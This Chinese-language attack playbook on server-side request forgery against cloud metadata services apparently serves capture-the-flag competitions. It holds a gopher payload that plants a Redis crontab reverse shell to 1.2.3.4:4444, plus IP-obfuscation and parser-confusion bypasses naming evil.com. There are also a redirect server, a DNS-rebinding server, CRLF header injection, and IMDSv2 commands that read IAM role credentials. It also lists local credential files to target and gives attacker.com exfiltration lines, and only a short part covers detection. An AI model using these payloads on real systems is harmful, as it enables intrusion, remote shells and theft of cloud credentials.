# SSRF 打云元数据：协议、绕过、两步 token 与失败退路

> 被 `competition-ssrf-metadata-pivot` 引用。分三层看：
> **源（能发什么请求）→ 转发（怎么被过滤/改写）→ 目标（元数据要什么）**。
> 90% 的失败死在中间那层。

## 一、先判定 SSRF 的"能力等级"

不要一上来就打元数据，先确定这个 SSRF 到底能发什么：

| 等级 | 能力 | 判定方式 | 能干什么 |
| --- | --- | --- | --- |
| L1 | 只能 GET 固定 host 的 path | 改 path 参数无效 | 基本无用 |
| L2 | 能改完整 URL，但 http/https only | `url=http://127.0.0.1:8080/` 有回显 | 打内网 HTTP 服务 |
| L3 | 支持任意 scheme（file/gopher/dict） | `url=file:///etc/passwd` 返回内容 | 读本地文件、gopher 打 Redis/MySQL |
| L4 | 能注入 header / 自定义 method | 需要 `-H` 的场景通了 | IMDSv2、GCP metadata |
| L5 | 能控制 DNS（自建域名） | 解析到自己 IP 有回连 | DNS rebinding 绕过 IP 黑名单 |

**能力测试清单**（按顺序打，每步都记录回显差异）：

```bash
# L2/L3：scheme 探测
url=http://127.0.0.1:22/           # 22 端口 → 回显 "SSH-2.0" 或连接错误差异
url=file:///etc/passwd
url=dict://127.0.0.1:6379/info
url=gopher://127.0.0.1:6379/_INFO

# L4：header 注入（用自建 collaborator 观察）
url=http://<your-collab>/  # 看请求里有没有自定义 header

# L5：DNS
url=http://<random>.<your-domain>/   # 看 DNS 查询日志
```

## 二、协议判定与各自能干什么

| scheme | 典型后端 | 能做什么 | 限制 |
| --- | --- | --- | --- |
| `http://` | 大多数 | 读内网 HTTP、元数据（v1） | 无法注入 header 时打不了 IMDSv2/GCP |
| `https://` | 同上 | 同上 + TLS 服务 | 证书校验常导致失败 |
| `file://` | Java/Go/PHP curl | 读本地文件 | 不能列目录（`file:///etc/` 多数失败） |
| `gopher://` | Java (URLConnection 不支持)、curl、部分 Go | 构造任意 TCP 字节流 → Redis/MySQL/FastCGI/SMTP | 需要 `%0d%0a` 编码；很多库已禁用 |
| `dict://` | curl | 探测端口 + 简单交互 | 只能发一行 |
| `ftp://` | 老库 | 探测/反弹（FTP bounce） | 少见 |
| `ldap://` | Java | 打内网 LDAP | JNDI 场景 |

**gopher 构造要点**（Redis 未授权写 crontab 的经典链）：

```text
gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2434%0D%0A%0A%0A*/1%20*%20*%20*%20*%20bash%20-i%20%3E%26%20/dev/tcp/1.2.3.4/4444%200%3E%261%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2416%0D%0A/var/spool/cron/%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adbfilename%0D%0A%243%0D%0Aroot%0D%0A%2A1%0D%0A%248%0D%0Asave%0D%0A
```

每个 `%0D%0A` 是 CRLF；RESP 协议里 `$` 后跟长度。写错一个字符整条就废——
**先用本地 redis 验证 payload，再打目标**。

## 三、绕过过滤的六类手法

### 3.1 IP 变形（打黑名单最有效）

```text
# 169.254.169.254 的等价写法（能不能用取决于后端解析器）
http://2852039166/                     # 十进制整数
http://0251.0376.0251.0376/            # 八进制（0251=169, 0376=254）
http://0xA9.0xFE.0xA9.0xFE/            # 十六进制分段
http://0xA9FEA9FE/                     # 十六进制整段
http://169.254.169.254.nip.io/         # 通配 DNS（解析回该 IP）
http://[::ffff:169.254.169.254]/       # IPv4-mapped IPv6
http://[::ffff:a9fe:a9fe]/
```

**URL 解析歧义类**（这类不是"等价 IP"，而是**让不同层解析出不同 host**）：

```text
http://169.254.169.254@evil.com/       # userinfo=169.254.169.254，真实 host=evil.com
http://evil.com#@169.254.169.254/      # 真实 host=evil.com，@ 之后进 fragment
http://evil.com\@169.254.169.254/      # 反斜杠在不同库中处理不同（部分库当路径分隔）
http://169.254.169.254%2f@evil.com/    # %2f 在 userinfo 里，host 仍是 evil.com
```

**用法**：allowlist 检查用的是"字符串包含"或"取第一个 @"时，会看到 `169.254` 而放行；
真正发请求的库取 `evil.com`。**两条路径解析不一致才有用**，光看 IP 变形不够。

**注意**：`http://0xA9FEA9FE/` 这类是否生效取决于后端解析器（Python `requests` 会拒绝，
Java `URL` 会当 host 解析失败，curl 支持十进制）。所以要**按后端语言选变形**：

| 后端 | 经验（**必须实测，不同版本行为不同**） |
| --- | --- |
| curl / libcurl | 十进制、八进制、十六进制基本都能解析 |
| Python (requests / urllib3) | 依赖底层 `getaddrinfo`；`169.254.169.254@evil.com` 会解析成 `evil.com` |
| Java `URLConnection` | `@` 前的部分被当 userinfo；畸形 host 常在 `openConnection` 阶段抛异常 |
| Node (axios / node-fetch) | 通常最宽松，`URL` 解析与 `dns.lookup` 分离，变形机会最多 |
| Go `net/http` | 最严格，畸形 host 直接报错 |

**验证方法**（比记表靠谱）：让后端去请求一个**你自己控制的 HTTP 服务**，
在服务端日志里看它实际解析到的 Host 与源 IP：

```bash
# 起一个只打印请求头的服务
python3 -m http.server 8000    # 或用 nc -l -p 8000 看原始请求
# 然后在 SSRF 参数里逐个塞变形，看哪个真的连到了你（而不是被解析成别的 host）
```

### 3.2 302 跳转绕过 allowlist

```bash
# 起跳板：用下面的 redirect.py（http.server 不会返回 302）
python3 redirect.py
```

```python
# redirect.py —— 只做 302
from http.server import BaseHTTPRequestHandler, HTTPServer
class H(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(302)
        self.send_header('Location', 'http://169.254.169.254/latest/meta-data/')
        self.end_headers()
HTTPServer(('0.0.0.0', 8000), H).serve_forever()
```

```bash
url=http://1.2.3.4:8000/    # allowlist 里放行 1.2.3.4，跳转后到元数据
```

**判据**：后端是否 `follow_redirects=True`。很多 SDK 默认跟随，这是最稳的绕过。

### 3.3 DNS rebinding

```bash
# 自建 DNS，第一次解析到白名单 IP，第二次到 169.254.169.254
# 工具：rbndr.us 风格，或自己写 dns server（dnslib）
# 注意事项：
#  - TTL 设 0
#  - 需要目标有 DNS 缓存绕过窗口
#  - 后端若在建立连接前重新解析 → 打到内网
```

```python
# 极简 rebinding DNS（dnslib）：pip install dnslib
# 目标域名 A 记录第一次给"合法"IP，第二次给元数据 IP
from dnslib.server import DNSServer, BaseResolver
from dnslib import RR, A, QTYPE
import itertools

ips = itertools.cycle(['1.2.3.4', '169.254.169.254'])
class R(BaseResolver):
    def resolve(self, req, handler):
        r = req.reply()
        r.add_answer(RR(req.q.qname, QTYPE.A,
                        rdata=A(next(ips)), ttl=0))
        return r

server = DNSServer(R(), address="0.0.0.0", port=53)
server.start_thread()          # 后台线程
input("listening on :53, Ctrl-C to stop\n")
```

**用之前必须做的事**：
1. 把目标域名的 NS 指到你的 DNS（或让 SSRF 直接用你的域名）；
2. `ttl=0`，且确认后端**不在连接池里复用解析结果**；
3. 用 `dig @your-dns rebind.example.com` 连查两次，确认两次 IP 不同。

**失败原因**：后端用了固定 IP 直连（`requests` 有连接池时会复用解析结果）、
或者 HTTP 客户端在建立连接后不再解析。

### 3.4 header 注入（打 IMDSv2 的唯一路）

需要 SSRF 能控制 header。常见入口：图片代理的 `Referer`/自定义头、webhook 的自定义 header 配置、
`X-Forwarded-Host` 被当作 upstream。

```bash
# 如果 SSRF 只允许 URL，试试 CRLF 注入
url=http://169.254.169.254/latest/api/token%0d%0aX-aws-ec2-metadata-token-ttl-seconds:%2021600
# 多数现代库会拦，但老版本 Python/Java 有戏
```

### 3.5 路径与参数污染

```bash
# 若后端做了 path 前缀校验
http://169.254.169.254/latest/meta-data/../../latest/meta-data/iam/
http://169.254.169.254/latest/meta-data/%2e%2e/
# 若后端拼接了固定 query
http://169.254.169.254/latest/meta-data/?x=1
# 有些实现会用 URL 的 host 做白名单但 path 拼接用户输入 → path traversal 回元数据
```

### 3.6 用元数据自身做跳板（SSRF → SSRF）

某些云服务的 user-data 里含内部 API 地址，或者 `http://169.254.169.254/latest/meta-data/network/interfaces/macs/<mac>/` 能列出子网信息 →
找内网服务。这不是绕过，是扩大战果。

## 四、IMDSv2 的两步流程（细节决定成败）

```bash
# Step 1：PUT 拿 token（必须 PUT，不是 GET；必须带 ttl header）
curl -s -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"
# 返回一串 base64ish 的 token，有效期由 ttl 决定（最大 21600 = 6h）

# Step 2：带 token 读
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
  "http://169.254.169.254/latest/meta-data/iam/security-credentials/"

# Step 3：读角色凭据
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
  "http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-app-role"
```

**SSRF 打 IMDSv2 的四种可能**：

| 场景 | 可行性 |
| --- | --- |
| SSRF 能发 PUT + 自定义 header | 直接成功 |
| SSRF 只能 GET，但能注入 CRLF | 老库有戏，现代库不行 |
| SSRF 只能 GET，后端跟随 302 | 302 不带 header，token 拿不到 → 失败 |
| 目标实例有**同机**的另一服务能读元数据 | 找 SSRF 打那个服务 |

**关键坑**：302 跳转**不会**携带原始 header（`X-aws-ec2-metadata-token`），
所以"302 绕过 allowlist"对 IMDSv2 无效。这是最常见的思路错误。

## 五、四家云的 header 记忆表

| 云 | header | 备注 |
| --- | --- | --- |
| AWS IMDSv2 | `X-aws-ec2-metadata-token: <token>` | 先 PUT `/latest/api/token` |
| GCP | `Metadata-Flavor: Google` | 缺失直接 403 |
| Azure | `Metadata: true` | 且必须 `api-version=` |
| 阿里云 | 无 | 地址 `100.100.100.200` |
| 腾讯云 | 无 | 地址 `metadata.tencentyun.com` |

## 六、拿不到时的替代路径（不要死磕）

| 死路 | 替代 |
| --- | --- |
| IMDSv2 + 无 header 注入 | 打 ECS task metadata `169.254.170.2`（无 token，需 env 里的 URI）；或打同机其它服务的本地 API |
| 元数据被 hop limit 拦（容器里 TTL=1） | 从宿主机 pid/mount ns 打；或找 hostNetwork 的 pod |
| GCP 缺 header | 找能注入 header 的 SSRF（webhook 配置、图片代理） |
| 元数据整体禁用（`http_endpoint=disabled`） | 转向本地凭据文件：`~/.aws/credentials`、`/root/.config/gcloud/`、`/etc/kubernetes/*`、`/var/run/secrets/` |
| 只有出网没有内网 | 打外部的 collaborator 确认 SSRF，再试 DNS rebinding |
| SSRF 只能读不能带出数据（blind） | 用 DNS 外带（把数据拼到子域）、或用时间盲注（`?p=1` vs 慢响应） |

**盲 SSRF 的数据外带**：

```bash
# 把元数据内容拼到自己的 DNS 查询里（若 SSRF 支持 host 拼接）
url=http://$(cat /tmp/x).attacker.com/
# 但 SSRF 通常无法先读后拼，这条路只适用于能二次注入的场景
# 更实用：让目标请求 http://attacker.com/?d=<固定探测结果>
```

## 七、检测视角

| 手法 | 日志 | 信号 |
| --- | --- | --- |
| 内网 SSRF 探测 | 应用日志 / WAF | 参数里出现 `169.254`、`127.0.0.1`、`file://`、`gopher://` |
| 十进制/十六进制 IP | WAF / 应用日志 | host 形如 `2852039166`、`0xA9FEA9FE` |
| 302 跳转链 | 代理日志 | 一次请求触发两次不同 host 的访问 |
| DNS rebinding | DNS 日志 | 同一域名短 TTL 反复解析到不同 IP |
| IMDSv2 PUT | VPC Flow / 主机 EDR | 非预期进程对 `169.254.169.254:80` 的 PUT |
| 元数据读取 | GuardDuty | `InstanceCredentialExfiltration` |
| gopher 打 Redis | Redis 日志 | `CONFIG SET dir`、`flushall` 来自非预期源 |

## 八、验伤信号

| 声称 | 硬证据 | 假成功反例 |
| --- | --- | --- |
| SSRF 成立 | 自己 collaborator 收到带目标特征的请求（UA、源 IP、时间） | 页面回 "error" 但没有真实回连 |
| 打通内网 HTTP | 返回内网服务的真实 banner/HTML（有内网主机名） | 返回的是 SSRF 代理自己的错误页 |
| 读到元数据 | JSON 里含 `AccessKeyId`/`role` 等真实字段 | 读到的是 IMDS 的错误 XML（`<?xml ...><Error><Code>...`） |
| 拿到凭据可用 | 用凭据调 `sts get-caller-identity` 返回目标账号 | 只看到 JSON，没验证过 |
| gopher 生效 | Redis `INFO` 回显 / 目标出现预期副作用 | 请求发出但无回显（blind，需另证） |

## 九、常见坑

1. **302 不携带 header**。想用跳转打 IMDSv2 一定失败。先确认目标是 v1 还是 v2。
2. **IP 变形按语言选**。curl 支持十进制，Python `requests` 基本不支持；
   拿 curl 验证通过的 payload 去打 Python 后端会失败。
3. **`file://` 读不了目录**。`file:///etc/` 多数返回空或错误，别以为路径不存在。
4. **gopher 的 CRLF 编码错一位全废**。`%0d%0a` 不是 `%0a`；RESP 的 `$<len>` 必须精确。
5. **内网地址段判断错**。`100.100.100.200`（阿里云）不是私网段但也不是公网，
   很多 allowlist 会放行；而 `169.254` 常被显式拉黑。
6. **DNS rebinding 需要 TTL=0 且后端不复用连接**。有连接池的客户端会一直用第一次的 IP。
7. **盲 SSRF 不要用"响应时间"当唯一证据**。网络抖动会骗人，要用多次采样 + 对照组。